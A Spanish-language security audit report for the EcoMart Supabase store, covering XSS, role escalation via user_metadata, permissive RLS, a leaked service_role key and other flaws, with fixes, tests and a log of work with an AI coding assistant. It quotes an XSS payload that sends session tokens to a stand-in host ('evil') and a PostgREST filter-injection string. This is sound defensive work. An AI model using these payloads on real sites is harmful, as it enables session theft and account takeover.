# Informe de auditoría de seguridad · EcoMart

**Proyecto:** EcoMart, tienda en línea de productos sostenibles (React 19 + Vite 8 + Supabase)
**Alcance:** componente de registro, flujo de compra, cliente de Supabase y políticas RLS
**Método:** revisión manual asistida por IA, guiada por una especificación (`docs/ESPECIFICACION.md`) y comprobada con pruebas automáticas sobre Postgres real (PGlite)
**Fecha:** 20 de noviembre de 2026

---

## 1. Resumen ejecutivo

Encontré **4 vulnerabilidades críticas** y **4 altas o medias**. Las 8 quedaron corregidas y verificadas. Combinadas, las críticas permitían a cualquier visitante:

1. ejecutar JavaScript en el navegador de otros clientes (XSS reflejado y almacenado);
2. volverse administrador con solo editar su propio perfil o su `user_metadata`;
3. leer teléfonos y direcciones de todos los clientes y cambiar los precios del catálogo;
4. obtener del bundle público una clave (`service_role`) que salta **todas** las políticas RLS.

| ID | Hallazgo | Severidad | CWE | Corrección | Verificación |
|---|---|---|---|---|---|
| **C1** | XSS por `dangerouslySetInnerHTML` (registro y detalle de producto) | Crítica | CWE-79 | Render como texto + lista blanca | `Registro.test.tsx`, prueba en navegador |
| **C2** | Escalada de privilegios: rol leído de `user_metadata` y columna `role` editable | Crítica | CWE-269, CWE-639 | `es_admin()` sobre `profiles.role` + privilegios por columna + trigger | `rls.test.ts` (C2) |
| **C3** | Políticas RLS permisivas y tabla sin RLS | Crítica | CWE-284, CWE-359 | Migración `20261120000000_hardening_rls.sql` | `rls.test.ts` (C3) |
| **C4** | `service_role` key en el bundle del cliente | Crítica | CWE-798 | Cliente único con anon key; panel admin vía RLS | `check-secretos.mjs`, `grep` |
| A1 | Inyección en filtros PostgREST (`.or()` con texto del usuario) | Alta | CWE-943 | `sanitizarBusqueda()` | `seguridad.test.ts` |
| A2 | El navegador fijaba el precio y el total del pedido | Alta | CWE-602 | RPC `crear_pedido` transaccional | `rls.test.ts` (A2) |
| A3 | Redirección abierta / `javascript:` en `?redirect=` | Media | CWE-601 | `rutaRedireccionSegura()` | `seguridad.test.ts`, navegador |
| A4 | Contraseña en `localStorage`, política de 4 caracteres, errores que revelan cuentas | Media | CWE-312, CWE-521, CWE-204 | Validación, sin almacenamiento, mensajes genéricos | `Registro.test.tsx` |

Los archivos originales vulnerables están en `docs/antes/` (copia exacta: al compilarlos se obtiene el mismo hash de bundle que la línea base, `index-BCozXI_V.js`).

---

## 2. Hallazgos críticos

### C1 · Cross-Site Scripting por `dangerouslySetInnerHTML`

**Dónde (antes):**
- `docs/antes/src/pages/Registro.tsx:51`: el código promocional se tomaba de la URL y se insertaba como HTML (**XSS reflejado**).
- `docs/antes/src/pages/Registro.tsx:80`: la "vista previa" pintaba el nombre y la bio como HTML.
- `docs/antes/src/pages/ProductoDetalle.tsx:26`: la descripción del producto venía de la base de datos y se insertaba como HTML (**XSS almacenado**).

```tsx
// ANTES
const promo = params.get('promo');
<div className="promo" dangerouslySetInnerHTML={{ __html: `🎁 Código aplicado: <b>${promo}</b>` }} />
```

**Ataque:** basta enviar a una víctima `https://ecomart…/registro?promo=<img src=x onerror="fetch('//evil/?c='+localStorage.getItem('sb-…-auth-token'))">`. El script corre en el origen de EcoMart y puede leer el token de sesión que supabase-js guarda en `localStorage`. **Cadena con C3:** como cualquier usuario podía editar `products.descripcion` (`using (true)`), el XSS almacenado afectaba a **todos** los que abrieran el producto. La prueba `rls.test.ts › ANTES › … cambia el precio y la descripción (XSS almacenado)` lo demuestra.

**Corrección:** se eliminó todo `dangerouslySetInnerHTML`. React escapa el texto en JSX, así que `<img …>` se ve literal. El código promo además pasa por una lista blanca (`/^[A-Z0-9-]{3,20}$/`) y los saltos de línea se conservan con CSS (`white-space: pre-line`), no con HTML.

```tsx
// DESPUÉS (src/pages/Registro.tsx)
const promo = codigoPromoValido(params.get('promo'));   // null si no pasa la lista blanca
{promo && <p className="promo">🎁 Código aplicado: <b>{promo}</b></p>}
...
<h3>{datos.nombre}</h3>
<p className="descripcion">{datos.bio}</p>                 // texto, nunca HTML
```

**Verificación:** 4 pruebas en `src/pages/Registro.test.tsx` y una prueba manual en el navegador (build de producción): con `?promo=<img…onerror…>` y la bio con el mismo payload, `window.__xss` siguió en `null` y no se creó ningún `<img>`.

> Si en el futuro la descripción necesita formato, la opción correcta es Markdown renderizado a componentes o HTML pasado por DOMPurify **con lista blanca de etiquetas**, más una cabecera CSP, nunca HTML crudo.

---

### C2 · Escalada de privilegios: el rol lo decidía el propio usuario

Había **tres caminos** para que un cliente se volviera administrador:

1. **`user_metadata` en una política RLS.** `20261101000000_esquema_inicial.sql:72-74`:
   ```sql
   create policy "Admins gestionan productos" on public.products for all
     using ((auth.jwt() -> 'user_metadata' ->> 'role') = 'admin');
   ```
   En Supabase, `user_metadata` (`raw_user_meta_data`) **lo escribe el propio usuario**: se fija en `signUp({ options: { data } })` y se cambia en cualquier momento con `supabase.auth.updateUser({ data: { role: 'admin' } })`. Usarlo para autorizar equivale a preguntarle al usuario si es admin.
2. **Parámetro de URL.** `docs/antes/src/pages/Registro.tsx:11` leía `?rol=` y `api.ts:41,50` lo enviaba a la metadata y a `profiles.role`.
3. **Columna `role` editable.** La política `"Cada usuario edita su perfil"` permitía `UPDATE` sobre la fila propia, **incluida la columna `role`**.

> **Detalle de RLS:** a esa política le faltaba `WITH CHECK`. Cuando una política `UPDATE` no lo tiene, Postgres **reutiliza la expresión `USING`** como `WITH CHECK`, así que no se podía "mover" la fila a otro `id`. El problema real no era de filas sino de **columnas**: RLS filtra filas, no columnas. Para proteger `role` hace falta la otra capa de Postgres, los privilegios (`GRANT`/`REVOKE`).

**Corrección** (`supabase/migrations/20261120000000_hardening_rls.sql`):

```sql
-- 1. Fuente de verdad: profiles.role, que el usuario no puede escribir.
create or replace function public.es_admin() returns boolean
language sql stable security definer set search_path = '' as $$
  select exists (select 1 from public.profiles
                 where id = (select auth.uid()) and role = 'admin');
$$;
revoke execute on function public.es_admin() from public, anon;

-- 2. Privilegios por columna: solo datos de contacto son editables.
revoke insert, update, delete on public.profiles from authenticated;
grant update (full_name, phone, address, bio) on public.profiles to authenticated;

-- 3. El perfil lo crea un trigger, SIEMPRE como 'cliente' (ignora la metadata).
create trigger al_crear_usuario after insert on auth.users
  for each row execute function public.crear_perfil_nuevo_usuario();
```

Decisiones:
- `SECURITY DEFINER` en `es_admin()` evita la **recursión infinita** que causaría consultar `profiles` desde una política de `profiles`. `set search_path = ''` impide secuestrar la función con objetos en otro esquema.
- `(select auth.uid())` hace que Postgres evalúe la función **una sola vez por consulta** (initPlan) y no una vez por fila.
- Supabase da `EXECUTE` a `anon` y `authenticated` por *default privileges*, así que `revoke … from public` **no basta**: hay que revocar explícitamente a `anon`.
- Alternativa evaluada: guardar el rol en `app_metadata` (solo lo escribe el servidor) y leerlo con `auth.jwt() -> 'app_metadata'`. Se descartó porque el JWT conserva el rol viejo hasta que se refresca (hasta 1 h después de quitarle el permiso a alguien). Leer la tabla aplica el cambio de inmediato.

**Verificación:** `rls.test.ts › DESPUÉS`: "Beto NO puede cambiar su rol" → `42501`; "user_metadata.role = admin ya no da permisos" → 0 filas; "el trigger crea el perfil como cliente aunque la metadata diga admin".

---

### C3 · Políticas RLS permisivas y una tabla sin RLS

| Tabla | Antes | Consecuencia | Después |
|---|---|---|---|
| `profiles` | `for select using (true)` | Cualquiera (incluso **anónimo**, con la anon key pública) leía teléfono, dirección y bio de todos los clientes | Solo el dueño o un admin; `anon` sin privilegio de lectura |
| `products` | `for update to authenticated using (true)` ("el checkout descuenta stock") | Cualquier cliente cambiaba **precios**, stock y descripciones (→ XSS almacenado) | Escritura solo admin (`USING` + `WITH CHECK` con `es_admin()`); lectura pública solo de `activo` |
| `orders` | `select using (auth.role() = 'authenticated')` | Cada cliente veía los pedidos (y direcciones) de **todos** | Dueño o admin |
| `orders` | `insert … with check (true)` | Crear pedidos **a nombre de otro** y con el total que quisiera | `INSERT` revocado; solo la RPC `crear_pedido` crea pedidos |
| `order_items` | **RLS desactivado** | Con la anon key cualquiera leía y escribía líneas de pedido | RLS activado; lectura atada al pedido; escritura revocada |

Principios aplicados en la migración:
1. **Dos capas:** `GRANT/REVOKE` define qué operaciones y columnas existen para cada rol; RLS define qué filas. Un `REVOKE` falla con un error claro (`42501`) y una política solo filtra en silencio.
2. **Todo `UPDATE` con `USING` y `WITH CHECK` explícitos**, aunque Postgres reutilice `USING`, para que la intención quede escrita.
3. **Políticas con `to authenticated` / `to anon`** en vez de comparar `auth.role()` dentro de la expresión.
4. **Restricciones de integridad** que también protegen: `precio > 0`, `stock >= 0`, `role in (...)`, `cantidad between 1 and 99`.

**Prueba de concepto y verificación:** `supabase/tests/rls.test.ts` aplica las migraciones sobre **Postgres 18.7 real (PGlite 0.5.17, compilado a WebAssembly)** con una réplica de lo que Supabase trae de fábrica: roles `anon`/`authenticated`, `auth.uid()` leído de `request.jwt.claims` como en PostgREST, y los *default privileges* que dan `GRANT ALL` a esos roles. Hay 7 pruebas "ANTES" que **demuestran cada ataque** y 14 pruebas "DESPUÉS" que demuestran que falla. Control de calidad de las pruebas: al ejecutar las pruebas "DESPUÉS" **sin** la migración de hardening, fallan 13 de 14 (la que pasa es positiva: "un admin real sí gestiona productos").

---

### C4 · La `service_role` key viajaba en el bundle

**Dónde (antes):** `docs/antes/src/lib/supabaseClient.ts:6-14` creaba un segundo cliente con `import.meta.env.VITE_SUPABASE_SERVICE_ROLE_KEY` para el panel de administración (`api.ts:115`).

Todo lo que empieza por `VITE_` **se incrusta en el JavaScript público**. La `service_role` key tiene el atributo `BYPASSRLS`: con ella cualquiera puede leer, modificar o borrar toda la base de datos, sin importar las políticas.

**Evidencia** (`docs/evidencias/secretos-antes.txt`, build con un `.env` de claves **falsas**):
- `grep -c "service_role" dist/` → **0**. ⚠️ El grep ingenuo no detecta la fuga, porque dentro del JWT el rol va en base64.
- `grep -oE "eyJ…InNlcnZpY2Vfcm9sZSJ9" dist/` → **encuentra** el payload `{"role":"service_role"}`.
- `node scripts/check-secretos.mjs` (decodifica cada JWT del bundle) → `✗ JWT con role=service_role`.

**Corrección:**
- Un solo cliente, creado con la anon key (`src/lib/supabaseClient.ts`). El panel admin usa ese cliente: RLS devuelve todos los pedidos **solo** si `es_admin()` es verdadero. Si alguna vez se necesita una operación privilegiada de verdad, va en una Edge Function con la clave como secreto del servidor.
- `src/vite-env.d.ts` declara solo las dos variables públicas; `.env.example` lo documenta y `.gitignore` excluye `.env*`.
- `npm run check:secretos` falla (código 1) si encuentra el texto `service_role` o un JWT con ese rol en `src/` o `dist/`. Se puede poner en CI.
- **Acción operativa obligatoria:** si una clave de servicio se publicó alguna vez, hay que **rotarla** en Supabase. Quitarla del código no la invalida.

**Verificación** (`docs/evidencias/secretos-despues.txt`): con **el mismo `.env`**, que todavía contiene la variable, `grep` en `src/` y `dist/` no encuentra nada y `check-secretos` termina con código 0. La anon key sí aparece en `dist/`, lo cual es correcto porque es pública por diseño.

---

## 3. Hallazgos altos y medios

**A1 · Inyección de filtros PostgREST.** `docs/antes/src/lib/api.ts:22` interpolaba la búsqueda en `.or('nombre.ilike.%…%,…')`. En la sintaxis de PostgREST, `,` separa condiciones y `.` separa columna, operador y valor, así que buscar `x%,activo.eq.false` añadía condiciones propias. **Corrección:** `sanitizarBusqueda()` deja solo letras, números, espacios y guiones (máx. 60). RLS sigue siendo la barrera de fondo (un anónimo ya no ve productos inactivos aunque lo intente).

**A2 · Manipulación de precio.** El total se calculaba en el carrito (`api.ts:83`) y el stock se descontaba con un `UPDATE` desde el navegador (`api.ts:99`). **Corrección:** la RPC `crear_pedido(p_items, p_direccion)` recibe solo `{product_id, cantidad}`, toma el precio de la tabla, descuenta el stock con `UPDATE … WHERE stock >= cantidad` (bloquea la fila: evita sobreventa concurrente) y todo ocurre en **una transacción**: si un producto no tiene stock, no queda nada a medias. Los productos se procesan en orden fijo para evitar interbloqueos.

**A3 · Redirección abierta.** `Login.tsx:20` hacía `window.location.href = params.get('redirect')`, lo que aceptaba `https://phishing…` y `javascript:…` (XSS). **Corrección:** `rutaRedireccionSegura()` solo acepta rutas internas y rechaza `//`, `\`, caracteres de control y esquemas. Usa `navigate()` del router.

**A4 · Autenticación débil.** La contraseña se guardaba en claro en `localStorage` ("Recordarme"), la política era de 4 caracteres y los errores de Supabase se mostraban tal cual (permitían saber si un correo estaba registrado). **Corrección:** sin almacenamiento de credenciales (la sesión la maneja supabase-js con tokens), mínimo 10 caracteres con letras y números, sin incluir el correo, y mensajes genéricos.

**Configuración que no se puede poner en una migración** y debe aplicarse en el panel de Supabase: Auth → *Password* (longitud mínima 10, letras y dígitos), confirmación de correo activada, *leaked password protection*, CAPTCHA en registro y límites de tasa. Como defensa en profundidad contra XSS: cabecera `Content-Security-Policy` en el hosting.

---

## 4. Proceso: Arquitectura Basada en Especificaciones

La **Arquitectura Basada en Especificaciones** (*spec-driven development*) invierte el orden habitual de trabajar con IA. En lugar de pedir "arregla la seguridad" y aceptar lo que salga, primero se escribe una **especificación verificable** y la IA trabaja contra ella. El ciclo que seguí:

1. **Especificar.** `docs/ESPECIFICACION.md` define un modelo de amenazas (qué controla cada actor) y requisitos con ID (`SEC-01…11`, `PERF-01…06`). Cada requisito trae su **criterio de aceptación ejecutable**: una prueba, un `grep` o una medición.
2. **Generar con contexto.** Cada prompt a la IA citaba la especificación y los IDs ("corrige SEC-02 sin romper SEC-04"). Así la IA no inventa el alcance y sus respuestas se pueden comparar con un criterio fijo.
3. **Verificar automáticamente.** Ninguna respuesta de la IA se aceptó solo por cómo se veía: se aceptó cuando la prueba correspondiente pasó y la prueba inversa (sin la corrección) falló.
4. **Retroalimentar la especificación.** Cuando la verificación mostró que un criterio estaba mal planteado, se corrigió **la especificación** y no solo el código (ver §6 de la especificación). Así el siguiente prompt ya partía del criterio correcto.

Lo valioso no es que la IA escriba código, sino que la especificación convierte cada respuesta en algo **refutable**. Las iteraciones 5, 6 y 9 de la bitácora son ejemplos de respuestas que parecían correctas y la verificación desmintió.

---

## 5. Bitácora del diálogo iterativo con la IA

Herramienta: asistente de IA para programación (Claude Code). Cada fila es una iteración de la sesión de trabajo; los prompts están resumidos a partir de la instrucción que se le dio a la IA en ese paso, y las respuestas están resumidas. Las correcciones marcadas en **negrita** ocurrieron de verdad durante la sesión. Las de secretos (5), medición (6) y caché (9) dejaron archivos en `docs/evidencias/`.

| # | Prompt (resumido) | Respuesta de la IA (resumida) | Decisión / verificación |
|---|---|---|---|
| 1 | "Revisa estas carpetas (`ecotrack-ai`, `carbon-tracker-service`, `ecotrack-dashboard`, `DiNNo`) y dime si alguna es la tienda EcoMart." | Ninguna lo es: dos son servicios de huella de carbono en Python, una es un dashboard de emisiones y DiNNo es otro producto. Propone crear `ecomart/` con una línea base "antes" realista. | Se crea la app: rutas, registro, catálogo, carrito, checkout y panel admin, con moment, lodash e importaciones estáticas. |
| 2 | "Antes de tocar código, redacta un modelo de amenazas y requisitos verificables para seguridad y bundle." | Tabla de actores y lo que controlan; requisitos SEC/PERF con criterio de aceptación. Señala que `user_metadata` es controlable por el usuario. | Se aprueba como `ESPECIFICACION.md` v1. |
| 3 | "Actúa como experto en ciberseguridad. Audita `Registro.tsx` buscando XSS, fallos de autenticación e inyección. Para cada hallazgo: línea, ataque concreto, severidad y corrección." | XSS reflejado (`?promo`), XSS en la vista previa, rol desde `?rol=`, contraseña en `localStorage`, política de 4 caracteres, mensajes que enumeran usuarios. | Se aceptan C1, C2 (en parte) y A4. Se pide además revisar `ProductoDetalle` → aparece el XSS almacenado. |
| 4 | "Audita la migración SQL como lo haría un pentester de Supabase: `using (true)`, `WITH CHECK` faltante, tablas sin RLS, uso de `user_metadata`." | Lista C3 completa y la política con `user_metadata`. Primero afirmó que la falta de `WITH CHECK` en `profiles` permitía "mover" la fila a otro id. | **Corregido tras verificar:** en Postgres, si falta `WITH CHECK`, se usa `USING`. El riesgo real es la columna `role` → se resuelve con privilegios por columna. |
| 5 | "Verifica con grep que la service_role no esté en `dist/`." | `grep service_role dist/` → 0 resultados: "no hay fuga". | **Refutado:** la clave (falsa) sí estaba en el bundle, en base64 dentro del JWT. Se pide un verificador que decodifique JWT → `scripts/check-secretos.mjs`. SEC-07 se actualiza. |
| 6 | "Mide el bundle antes y después." | Antes 471,23 kB (152,87 gzip). Después de `manualChunks`, el total sube a ~530 kB. | **Investigado:** sin `.env`, el código de Supabase es una rama muerta y el minificador lo eliminaba solo en el bundle único. Se repiten **todas** las mediciones con un `.env` de producción (falso) → antes 690,79 kB. Se crea `comparar-bundles.sh` (PERF-06). |
| 7 | "¿Cómo pruebo las políticas RLS sin un proyecto de Supabase?" | Propone PGlite (Postgres en WebAssembly) con una réplica de `auth.uid()`, roles y *default privileges*, y transacciones que se revierten por prueba. | 21 pruebas. Se pide una **prueba de mutación**: sin hardening fallan 13 de 14 → las pruebas sí detectan el problema. |
| 8 | "Aplica `React.lazy` + `Suspense` en las rutas." | Primera versión: `Suspense` alrededor de `<Routes>`. | **Corregido:** así la cabecera desaparecía mientras cargaba cada página. `Suspense` pasa a vivir dentro del `Layout`, alrededor de `<Outlet/>`, con un límite de error para fallos de red. |
| 9 | "`manualChunks` no redujo bytes (la variante de control pesa casi igual). ¿Cómo lo justifico?" | Su valor es la caché: los `vendor-*` no cambian de hash entre despliegues. Propone medir cuánto se vuelve a descargar tras un cambio pequeño. | Experimento real: con `manualChunks` se re-descargan **13,04 kB gzip**; sin él, **146,10 kB**. |
| 10 | "Revisa tus propios comentarios en busca de afirmaciones falsas." | Detecta que el comentario de `vite-env.d.ts` decía que TypeScript impide leer otras variables. | **Falso** (`vite/client` declara una firma de índice). Se corrige el comentario y la regla queda a cargo de `check-secretos`. |

**Qué aprendí del proceso:** la IA acelera mucho la búsqueda de hallazgos y la escritura de pruebas, pero en 5 de 10 iteraciones su primera respuesta tenía un error sutil (un falso negativo de seguridad, una medición engañosa o una afirmación técnica falsa). La especificación con criterios ejecutables fue lo que permitió detectarlos.

---

## 6. Qué se verificó y qué no

**Verificado:** `tsc -b` (app y pruebas), 51 pruebas de Vitest (21 de RLS sobre Postgres real con PGlite, 30 de utilidades y del componente de registro), `vite build` y una prueba manual en el navegador del build de producción en modo demo (flujo catálogo → carrito → checkout → pedidos, XSS y redirección).

**No verificado contra un Supabase real:**
- Las migraciones se probaron en PGlite con una **réplica** del entorno de Supabase (`supabase/tests/supabase-stub.sql`), no en un proyecto alojado. Lo más sensible a diferencias es el trigger sobre `auth.users` y los *default privileges* reales del proyecto.
- Los flujos reales de Supabase Auth (registro con confirmación de correo, refresco de tokens) y las llamadas `rpc()`/`.or()` a través de PostgREST no se ejecutaron contra un servidor.
- La configuración del panel de Supabase (§3) es una recomendación: no se aplicó.

Antes de desplegar: `supabase db push` en un proyecto de *staging*, repetir los ataques de §2 con dos cuentas reales y ejecutar el *Security Advisor* de Supabase.
